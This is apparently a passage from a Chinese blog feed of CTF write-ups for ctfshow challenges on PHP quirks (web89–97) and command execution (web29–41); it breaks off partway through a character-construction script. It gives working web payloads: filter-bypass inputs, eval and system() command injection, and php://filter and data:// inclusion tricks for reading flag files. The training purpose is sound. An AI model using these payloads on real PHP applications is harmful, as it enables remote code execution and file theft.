        <content type="html"><![CDATA[<h1>PHP特性</h1><h2 id="常见特性及敏感函数总结">常见特性及敏感函数总结</h2><ol><li>==与===</li><li>md5 0e绕过、数组绕过</li><li>intval 进制或小数绕过</li><li>strpos 换行绕过</li><li>in_array 第三个参数是否设置，不设置为弱类型比较</li><li>preg_match 数组绕过，不带\m可用换行绕过</li><li>str_replace 无递归，双写绕过</li></ol><h2 id="web89">web89</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.w3cschool.cn/php/php-intval.html">intval</a>PHP中获取变量整数值的函数，遇到非空array返回1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1  # 使用数组绕过</span><br></pre></td></tr></table></figure><h2 id="web90">web90</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>intval函数用法可见以上链接，用十六进制绕过<br><code>?num=0x117c</code></p><h2 id="web91">web91</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123; <span class="comment"># /i表示不区分大小写</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123; <span class="comment"># /m 表示换行匹配</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见两判断条件的正则不同，第二个条件没有换行匹配，则可以用换行符绕过<br><code>?cmd=1%0aphp</code></p><h2 id="web92">web92</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>可用同90方法<br><strong>其他姿势</strong><br>intval()函数如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mtext>为</mtext><mn>0</mn><mtext>则</mtext></mrow><annotation encoding="application/x-tex">base为0则</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">为</span><span class="mord">0</span><span class="mord cjk_fallback">则</span></span></span></span>var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以</p><h2 id="web93">web93</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了字母，不能用十六进制，可以用八进制绕过<br><code>?num=010574</code></p><h2 id="web94">web94</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在93的基础上过滤了开头为0的数字 这样的话就不能使用进制转换来进行操作 我们可以使用小数点来进行操作。这样通过intval()函数就可以变为int类型的4476<br><code>?num=4476.0</code></p><h2 id="web95">web95</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可通过换行绕过strpos函数<br><code>?num=%0a010574</code></p><h2 id="web96">web96</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>强制匹配<code>flag.php</code>，用Linux当前路径绕过即可<br><code>?u=./flag.php</code></p><h2 id="web97">web97</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>经典MD5,无脑数组过（注意POST）传参<br><code>a[]=1&amp;b[]=2</code></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PHP特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow题解-命令执行</title>
      <link href="/2023/08/08/CTFshow/CTFshow2/"/>
      <url>/2023/08/08/CTFshow/CTFshow2/</url>
      
        <content type="html"><![CDATA[<h1>命令执行</h1><h2 id="29-web29">29.web29</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>严格来说属于eval代码执行<br>只过滤了/flag<br>可以做一些常规的尝试<br>/?c=phpinfo();   查看环境变量<br>/?c=system(‘ls’);  查看目录，发现flag.php<br>可以将php文件中内容拷贝到txt中<br>/?c=system(“cp fl*g.php 1.txt”);   <strong>用通配符<code>*</code>或者<code>?</code>绕过</strong><br>/?c=system(“cat fl?g.php”);<br>/1.txt  访问1.txt 得到flag</p><h2 id="30-web30">30.web30</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>比起上一题多过滤了system和php<br>我们换一种方法，在PHP中反引号包含的代码也是可执行的<br>构造payload ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=echo(`ls`);</span><br></pre></td></tr></table></figure><p>确定目标文件flag.php后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=`cp fla?.??? 1.txt`;</span><br></pre></td></tr></table></figure><p>最后访问/1.txt</p><h2 id="31-web31">31.web31</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>过滤的关键字明显多了起来<br>我们尝试eval嵌套的命令执行来实现参数逃逸</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?c=eval($_GET[1]);&amp;1=phpinfo();  </span><br><span class="line">/?c=eval($_GET[1]);&amp;1=system(&#x27;ls&#x27;);</span><br><span class="line">/?c=eval($_GET[1]);&amp;1=system(&#x27;cp flag.php 1.txt&#x27;);</span><br></pre></td></tr></table></figure><p>访问/1.txt<br>这里补充一下另外几种访问flag.php的方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/?c=eval($_GET[1]);&amp;1=system(&#x27;cp flag.php 1.txt&#x27;); </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">拷贝到/1.txt</span></span><br><span class="line">/?c=eval($_GET[1]);&amp;1=system(&#x27;cat flag.php&#x27;); </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">需要查看源代码</span></span><br><span class="line">/?c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;); </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">倒序输出</span></span><br></pre></td></tr></table></figure><h2 id="32-web32">32.web32</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>比上一题多过滤了<code>小括号</code>、<code>反引号</code>、<code>分号</code>、<code>空格</code>等<br>用文件包含函数<br>%0a url编码的换行符代替(<br>php语言最后一句话可省略分号，故用?&gt;绕过<br>再用php伪协议读取即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="33-web33">33.web33</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>比上一题多过滤了双引号，用上一题做法也可做<br>这次我们尝试用require</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=require%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>可以正常包含，解码得到flag</p><h2 id="34-web34">34.web34</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>多过滤了冒号，是为了过滤直接进行伪协议的参数<br>补充说明因为过滤了<code>小括号</code>、<code>分号</code>，只能使用php语言结构<code>print</code>、<code>echo</code>、<code>isset</code>、<code>unset</code>、<code>include</code>、<code>require</code>（不需要使用括号）<br>依然使用以上两种payload即可过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=require%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="35-web35">35.web35</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>相较上题多过滤了<code>&lt;</code>、<code>=</code><br>不过并不影响我们用以上方法绕过，不多赘述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=require%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="36-web36">36.web36</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>多过滤了数字，我们将变量名改为字母即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="37-web37">37.web37</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>考察<code>include</code>函数漏洞<br>利用data伪协议，将传入的字符串作为php代码执行<br><code>?c=data://text/plain,&lt;?php phpinfo()?&gt;</code> 经过测试可以正常执行<br>类似web29构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac fla*&quot;)?&gt;</span><br></pre></td></tr></table></figure><h2 id="38-39-web38-39">38、39.web38、39</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>此题多过滤了php、file<br>且在include后强制包含了后缀.php</p><?php可用<?=代替  `短标签绕过`> 注意理解代码执行和文件包含的关系我们继续使用data伪协议，代码执行优先<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?= system(&quot;tac fla*&quot;)?&gt;</span><br></pre></td></tr></table></figure>## 40.web40### 题目描述**命令执行，需要严格的过滤**### 解题思路<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))</span><br></pre></td></tr></table></figure>看到以上过滤，可见字母、分号、下划线未被过滤解法较多一些网上看到的技巧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>还可通过cookie获得参数进行命令执行，经测试只能执行`ls`，无法拿到值更改cookie值passid=ls<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=session_start();system(session_id());</span><br></pre></td></tr></table></figure>最后一种巧妙的思路先尝试打印当前的所有变量<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(get_defined_vars());</span><br><span class="line">#Array ( [_GET] =&gt; Array ( [c] =&gt; print_r(get_defined_vars()); ) [_POST] =&gt; Array ( ) [_COOKIE] =&gt; Array ( [PHPSESSID] =&gt; tkhs3pjqvj2f4ag9hreibpfkpg ) [_FILES] =&gt; Array ( ) [c] =&gt; print_r(get_defined_vars()); )</span><br><span class="line"># 可以看到_GET和_POST等类型变量储存在数组中</span><br></pre></td></tr></table></figure>我们可以以POST形式传参`a=phpinfo()`，发现数组也有变化` [_POST] => Array ( [a] => phpinfo() )`此时思路是拿到数组中的字符串，我们就可以进行RCE（远程代码执行）我们用next操作拿到存放_POST变量的数组`?c=print_r(next(get_defined_vars()));`利用数组弹出操作拿到数组中值`?c=print_r(array_pop(next(get_defined_vars())));`接下来执行代码即可`?c=eval(array_pop(next(get_defined_vars())));`改变传参拿到flag`a=system("tac flag.php");`## 41.web41### 题目描述**过滤不严，命令执行**### 解题思路[思路参考](https://blog.csdn.net/miuzzx/article/details/108569080)这个题过滤了`$、+、-、^、~`使得**异或自增和取反**构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符`|`<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;, $c))</span><br></pre></td></tr></table></figure>因为过滤了大部分可见字符，通过不可见字符做或运算构造字母的脚本<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span 